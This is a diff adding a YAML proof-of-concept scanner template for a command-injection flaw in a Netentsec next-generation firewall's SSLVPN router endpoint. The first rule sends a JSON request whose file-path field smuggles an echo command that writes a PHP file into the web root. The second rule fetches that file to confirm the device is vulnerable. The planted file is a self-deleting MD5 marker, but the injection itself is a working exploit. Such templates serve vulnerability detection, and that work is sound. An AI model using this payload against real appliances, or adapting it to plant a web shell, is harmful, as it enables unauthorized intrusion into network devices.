@@ -1,0 +1,31 @@
+name: yaml-poc-netentsec-ngfw-command_injection-CT-194295
+binding: 501660b4-1e40-4bc8-ba72-5f95e146343e
+detail:
+    author: system_user
+    links:
+        - https://blog.csdn.net/weixin_43227251/article/details/115658803
+    vulnerability:
+        id: bbd24d76-d841-4ae0-9d9e-20d15988626f
+        level: critical
+    warning: File Upload (Auto Clear)
+transport: http
+set:
+    r2: randomLowercase(10)
+rules:
+    r0:
+        request:
+            cache: true
+            method: POST
+            path: /directdata/direct/router
+            headers:
+                Content-Type: application/json
+            body: |
+                {"action":"SSLVPN_Resource","method":"deleteImage","data":[{"data":["/var/www/html/d.txt;echo '<?php echo md5({{r2}});unlink(__FILE__);?>' >/var/www/html/{{r2}}.php"]}],"type":"rpc","tid":17}
+        expression: response.status == 200 && response.body.bcontains(b"SSLVPN_Resource") && response.body.bcontains(b"\"result\":{\"success\":true}")
+    r1:
+        request:
+            cache: true
+            method: GET
+            path: /{{r2}}.php
+        expression: response.status == 200 && response.body.bcontains(bytes(md5(r2)))
+expression: r0() && r1()
